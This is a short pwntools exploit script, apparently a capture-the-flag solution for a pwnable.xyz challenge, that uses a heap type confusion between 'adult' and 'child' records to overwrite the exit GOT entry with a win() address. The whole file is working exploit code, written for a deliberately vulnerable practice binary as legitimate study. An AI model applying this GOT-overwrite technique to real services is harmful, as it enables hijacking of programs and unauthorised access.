###Type confusion
###I didn't know we can actually send empty message to read(), that's some useful knowledge learned

from pwn import *

###Structure
'''
adult
    |   8   |   8   |
0x00|nameptr|   2   |
0x10|  age  |job_ptr|

child
    |   8   |   8   |
0x00|nameptr|   1   |
0x10|job_ptr|  age  |
'''

###Util
def create_child(age,name,job):
    r.sendlineafter('> ','2')
    r.sendlineafter('Age: ',str(age))
    r.sendafter('Name: ',name)
    r.sendafter('Job: ',job)

def age_up(idx):
    r.sendlineafter('> ','3')
    r.sendlineafter('Person: ',str(idx))

def call_exit():
    r.sendlineafter('> ','4')

def transform(idx,name,job,mode='normal'):
    if mode=='normal':
        r.sendlineafter('> ','5')
    else:
        r.sendline('5')
    r.sendlineafter('Person: ',str(idx))
    r.sendafter('Name: ',name)
    r.sendafter('Job: ',job)

###Addr
exit_got = 0x602070
win = 0x4009b3

###Exploit
r = remote('svc.pwnable.xyz',30038)

###Prepare two blocks
create_child(18,'M30W','M30W')
create_child(0,'M30W','M30W')

###Transform from child chunk to adult chunk
transform(0,'M30W','M30W',mode='normal')

###Tweak job_ptr to point to next 
for i in range(0x30):
    print(hex(i))
    age_up(0)

###Transform from child back to adult
transform(0,'M30W','',mode='normal')

###Hijack chunk2 name_ptr to exit_got
###The menu would not be printed after empty message, I wonder what the mechanism is though...
transform(0,'M30W',p64(exit_got),mode='after')

###Hijack exit_got to win()
transform(1,p64(win),'M30W',mode='normal')

###Call exit()
r.sendlineafter('> ','4')

r.interactive()
